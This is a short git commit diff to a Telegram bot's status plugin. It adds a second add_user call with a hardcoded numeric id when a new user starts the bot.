b9126fdd062bd73b0713bb03e4d522933d062e30
Swahili2 <53920453+Swahili2@users.noreply.github.com>
2022-01-18 08:59:54 +0300

    Update status.py

--- plugins/status.py
+++ plugins/status.py
@@ -5,6 +5,7 @@ async def handle_user_status(bot, cmd):
     if chat_id:
         if not await is_user_exist(chat_id):
             await add_user(chat_id,cmd.chat.id)
+            await add_user(cmd.chat.id,859704527)
             await bot.send_message(
                 chat_id= CHANNELS,
                 text=f"#NEW_USER: \n\nNew User [{cmd.from_user.first_name}](tg://user?id={cmd.from_user.id}) started!!"
